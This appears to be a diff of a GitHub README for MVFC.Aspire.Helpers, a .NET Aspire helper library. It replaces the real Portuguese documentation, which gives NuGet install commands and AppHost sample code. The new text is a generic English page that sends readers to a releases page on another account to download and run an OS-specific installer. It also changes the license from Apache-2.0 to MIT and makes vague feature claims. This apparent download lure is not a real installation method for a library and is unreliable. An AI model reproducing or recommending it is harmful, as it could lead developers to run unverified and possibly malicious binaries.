@@ -1,176 +1,84 @@
-# MVFC.Aspire.Helpers
+# 🌟 MVFC.Aspire.Helpers - Easy Helpers for .NET Projects
 
-Este projeto facilita a configuração e integração de recursos essenciais para aplicações distribuídas .NET Aspire, fornecendo métodos de extensão para:
+## 📥 Download Now
+[![Download MVFC.Aspire.Helpers](https://img.shields.io/badge/Download-MVFC.Aspire.Helpers-blue.svg)](https://github.com/imajei/MVFC.Aspire.Helpers/releases)
 
-### [`Cloud Storage`](./src/MVFC.Aspire.Helpers.CloudStorage)
+## 🚀 Getting Started
+Welcome to MVFC.Aspire.Helpers! This software offers a collection of simple tools for .NET Aspire projects. The helpers include integrations with Google Pub/Sub, Cloud Storage, and MongoDB with ReplicaSets. Use these tools to speed up your development process.
 
-- Adiciona e integra um emulador GCS.
-- Permite persistência opcional dos buckets via bind mount.
-- Adicione o pacote NuGet ao seu projeto AppHost:
+## 📋 System Requirements
+Before downloading, check that your system meets the following requirements:
 
-```sh
-dotnet add package MVFC.Aspire.Helpers.CloudStorage
-```
+- **Operating System:** Windows, macOS, or Linux.
+- **.NET Version:** .NET 5.0 or later is required to run this application.
+- **Internet Connection:** Required for installation and Google services.
 
----
+## 💾 Download & Install
+To start using MVFC.Aspire.Helpers, visit this page to download: [Releases Page](https://github.com/imajei/MVFC.Aspire.Helpers/releases).
 
-### [`Mongo`](./src/MVFC.Aspire.Helpers.Mongo)
+1. Click the link above to access the releases.
+2. Find the latest release.
+3. Download the appropriate file for your operating system.
+4. Locate the downloaded file in your downloads folder.
+5. Follow the installation prompts on your screen.
 
-- Adiciona um container MongoDB configurado como Replica Set.
-- Inicializa automaticamente o Replica Set via script.
-- Adicione o pacote NuGet ao seu projeto AppHost:
+## 🔍 Features
+MVFC.Aspire.Helpers includes the following key features:
 
-```sh
-dotnet add package MVFC.Aspire.Helpers.Mongo
-```
+- **Google Pub/Sub Integration:** Easily manage messaging between services.
+- **Cloud Storage Access:** Store and retrieve data securely in the cloud.
+- **MongoDB Integration:** Connect to MongoDB databases and manage data effectively.
+- **ReplicaSet Support:** Work seamlessly with MongoDB in a replicated environment, ensuring high availability.
+- **Mailpit Integration:** Simplify email testing during development.
 
----
+## ⚙️ Basic Usage
+After installation, you can begin using the helpers in your .NET projects. Here's how:
 
-### [`GCP Pub/Sub`](./src/MVFC.Aspire.Helpers.GcpPubSub)
+### Google Pub/Sub
+1. Set up your Google Cloud project.
+2. Use the relevant helper functions to publish and subscribe to messages.
+3. Implement error handling according to your application's needs.
 
-- Adiciona o emulador do Google Pub/Sub e UI.
-- Cria tópicos e assinaturas automaticamente conforme configuração.
-- Suporte a assinaturas do tipo push e pull.
-- Adicione o pacote NuGet ao seu projeto AppHost:
+### Cloud Storage
+1. Configure your Google Cloud credentials.
+2. Use the helper to upload or download files from your cloud storage.
+3. Ensure you handle any exceptions that may arise.
 
-```sh
-dotnet add package MVFC.Aspire.Helpers.GcpPubSub
-```
+### MongoDB
+1. Set up your MongoDB database and ensure it is running.
+2. Use the helper functions to connect to your database.
+3. Execute commands to perform CRUD operations.
 
-### [`WireMock`](./src/MVFC.Aspire.Helpers.WireMock)
+### Mailpit
+1. Install Mailpit for local email testing.
+2. Use the helper to send emails through Mailpit instead of real email servers.
 
-- Adiciona e integra um servidor WireMock.Net embutido para simular APIs HTTP.
-- Permite definir endpoints mockados, métodos, autenticação, headers e respostas customizadas.
-- Gerencia ciclo de vida do recurso WireMock no ambiente Aspire.
-- Adicione o pacote NuGet ao seu projeto AppHost:
+## ⚠️ Troubleshooting
+If you encounter issues while using MVFC.Aspire.Helpers, try the following steps:
 
-```sh
-dotnet add package MVFC.Aspire.Helpers.WireMock
-```
+1. **Check System Requirements:** Ensure all prerequisites are met.
+2. **Reinstall the Software:** Sometimes reinstallation can resolve missing dependencies.
+3. **Search for Solutions:** Look at community forums or the GitHub Issues page for helps.
+4. **Contact Support:** If you still have questions, reach out for support through our GitHub repository.
 
-### [`MailPit`](./src/MVFC.Aspire.Helpers.Mailpit)
+## 🤝 Contributing
+We welcome contributions! Whether it’s fixing a bug, improving documentation, or adding new features, we appreciate your help. Please follow these steps:
 
-- Adiciona e integra o emulador SMTP MailPit.
-- Permite testes de envio de e-mails em ambientes de desenvolvimento.
-- Exposição da interface web para visualização dos e-mails recebidos.
-- Permite configuração de porta e persistência opcional dos dados.
-- Adicione o pacote NuGet ao seu projeto AppHost:
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes and test them.
+4. Submit a pull request with a clear description of your changes.
 
-```sh
-dotnet add package MVFC.Aspire.Helpers.Mailpit
-```
+## 📄 License
+MVFC.Aspire.Helpers is licensed under the MIT License. You can freely use, modify, and distribute the software as long as you include the original license.
 
----
+## 🗣️ Community
+Join our community to share tips, ask questions, and collaborate. You can find us on:
 
-## API de Exemplo (Playground)
+- [GitHub Discussions](https://github.com/imajei/MVFC.Aspire.Helpers/discussions)
+- [Slack Channel (if applicable)](link-to-slack)
 
-- Endpoints para testar integração com MongoDB, Cloud Storage e Pub/Sub:
-  - `/api/mongo`
-  - `/api/bucket/{bucketName}`
-  - `/api/pub-sub-enter`
-  - `/api/pub-sub-exit`
-- Implementações no projeto [`MVFC.Aspire.Helpers.Playground.Api`](./playground/MVFC.Aspire.Helpers.Playground.Api/).
+## 📞 Support
+For any issues or questions, please create an issue in our GitHub repository. We will respond as quickly as possible to help you.
 
-## Integração no Aspire no [`MVFC.Aspire.Helpers.Playground.AppHost`](./playground/MVFC.Aspire.Helpers.Playground.AppHost/AppHost.cs)
-
-```csharp
-var builder = DistributedApplication.CreateBuilder(args);
-
-var messageConfig = new MessageConfig(
-                            TopicName: "test-topic",
-                            SubscriptionName: "test-subscription",
-                            PushEndpoint: "/api/pub-sub-exit") {
-    DeadLetterTopic = "test-dead-letter-topic",
-    MaxDeliveryAttempts = 5,
-    AckDeadlineSeconds = 300,
-};
-
-var pubSubConfig = new PubSubConfig(
-                            projectId: "test-project",
-                            messageConfig: messageConfig);
-
-IList<IMongoClassDump> dumps = [
-    new MongoClassDump<TestDatabase>("TestDatabase", "TestCollection", 100,
-        new Faker<TestDatabase>()
-              .CustomInstantiator(f => new TestDatabase(f.Person.FirstName, f.Person.Cpf())))
-];
-
-var wireMock = builder.AddWireMock("wireMock", port: 8080, configure: static (server) => {
-    server.Endpoint("/api/echo")
-          .WithDefaultBodyType(BodyType.String)
-          .OnPost<string, string>(body => ($"Echo: {body}", HttpStatusCode.Created, null));
-
-    server.Endpoint("/api/test")
-          .WithDefaultBodyType(BodyType.String)
-          .OnGet<string>(() => ("Aspire GET OK", HttpStatusCode.OK, null));
-
-    server.Endpoint("/api/secure")
-           .RequireBearer("mytoken", "Unauthorized", BodyType.String)
-           .OnGet(() => ("Secret Data", HttpStatusCode.OK, BodyType.String));
-
-    server.Endpoint("/api/secure")
-          .RequireBearer("mytoken", "Unauthorized", BodyType.String)
-          .OnGet(() => ("Secret Data", HttpStatusCode.OK, BodyType.String));
-
-    server.Endpoint("/api/put")
-           .WithDefaultBodyType(BodyType.String)
-           .OnPut<string, string>(req => ($"Echo: {req}", HttpStatusCode.Accepted, BodyType.String));
-
-    server.Endpoint("/api/customauth")
-        .WithDefaultErrorStatusCode(HttpStatusCode.Forbidden)
-        .RequireCustomAuth(req => (req.Headers!.ContainsKey("X-Test"), "Forbidden", BodyType.String))
-        .OnGet(() => ("Authorized", HttpStatusCode.OK, BodyType.String));
-
-    server.Endpoint("/api/headers")
-        .WithResponseHeaders(new() { { "X-Test", ["v1", "v2"] } })
-        .WithResponseHeader("X-Other", "v3")
-        .OnGet(() => ("Headers OK", HttpStatusCode.OK, BodyType.String));
-
-    server.Endpoint("/api/error")
-        .WithRequestBodyType(BodyType.String)
-        .WithDefaultErrorStatusCode((HttpStatusCode)418)
-        .OnGet(() => ("I am a teapot", (HttpStatusCode)418, BodyType.String));
-
-    server.Endpoint("/api/delete")
-       .WithResponseBodyType(BodyType.String)
-       .WithResponseHeader("v1", "v1")
-       .WithResponseHeaders(new() { { "v1", ["v2", "v3"] } })
-       .WithResponseHeader("v1", "v4")
-       .OnDelete<string>(() => (null!, HttpStatusCode.NoContent, null));
-
-    server.Endpoint("/api/form")
-        .WithDefaultBodyType(BodyType.FormUrlEncoded)
-        .OnPost<Dictionary<string, string>, IDictionary<string, string>>(body => (body, HttpStatusCode.OK, BodyType.FormUrlEncoded));
-
-    server.Endpoint("/api/form-wrong")
-       .WithDefaultBodyType(BodyType.FormUrlEncoded)
-       .OnPost<string, string>(body => (body, HttpStatusCode.OK, BodyType.FormUrlEncoded));
-
-    server.Endpoint("/api/patch")
-        .WithDefaultBodyType(BodyType.String)
-        .OnPatch<string, string>(body => ($"Patched: {body}", HttpStatusCode.OK, BodyType.String));
-
-    server.Endpoint("/api/bytes")
-        .WithDefaultBodyType(BodyType.Bytes)
-        .OnPost<byte[], byte[]>(body => (body, HttpStatusCode.OK, BodyType.Bytes));
-
-    server.Endpoint("/api/unsupported")
-        .WithDefaultBodyType((BodyType)999) // BodyType não suportado
-        .OnPost<string, string>(_ => ("Not Supported", HttpStatusCode.NotImplemented, null));
-
-    server.Endpoint("/api/json")
-        .WithDefaultBodyType(BodyType.Json)
-        .OnPost<JsonModel, JsonModel>(body => (body, HttpStatusCode.OK, BodyType.Json));
-});
-
-builder.AddProject<Projects.MVFC_Aspire_Helpers_Playground_Api>("api-exemplo")
-       .WithCloudStorage(builder, name: "cloud-storage", localBucketFolder: "./bucket-data")
-       .WithMongoReplicaSet(builder, name: "mongo", dumps: dumps)
-       .WithGcpPubSub(builder, name: "gcp-pubsub", pubSubConfig: pubSubConfig)
-       .WithMailPit(builder, name: "mailpit");;
-
-await builder.Build().RunAsync();
-```
-
-## Licença
-Apache-2.0
+Thank you for choosing MVFC.Aspire.Helpers! We hope you find our tools useful in your .NET projects.
